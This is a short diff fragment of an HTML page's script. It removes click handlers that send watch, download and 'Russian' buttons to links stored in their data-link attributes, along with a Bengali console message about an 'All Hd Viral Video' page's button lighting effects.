-    const downloadBtns = document.querySelectorAll('.btn-download');
-    const russianBtns = document.querySelectorAll('.btn-russian');
-
-    watchBtns.forEach(btn => {
-        btn.addEventListener('click', function(e) {
-            e.preventDefault();
-            e.stopPropagation();
-            const link = this.getAttribute('data-link');
-            window.location.href = link;
-        });
-    });
-
-    downloadBtns.forEach(btn => {
-        btn.addEventListener('click', function(e) {
-            e.preventDefault();
-            e.stopPropagation();
-            const link = this.getAttribute('data-link');
-            window.location.href = link;
-        });
-    });
-
-    russianBtns.forEach(btn => {
-        btn.addEventListener('click', function(e) {
-            e.preventDefault();
-            e.stopPropagation();
-            const link = this.getAttribute('data-link');
-            window.location.href = link;
-        });
-    });
-
-    console.log("✅ All Hd Viral Video - ছবি + সব বাটনে লাইটিং ইফেক্ট যুক্ত (প্লাস বাটন সরানো হয়েছে)");
 </script>
 </body>
-</html>
+    </html>
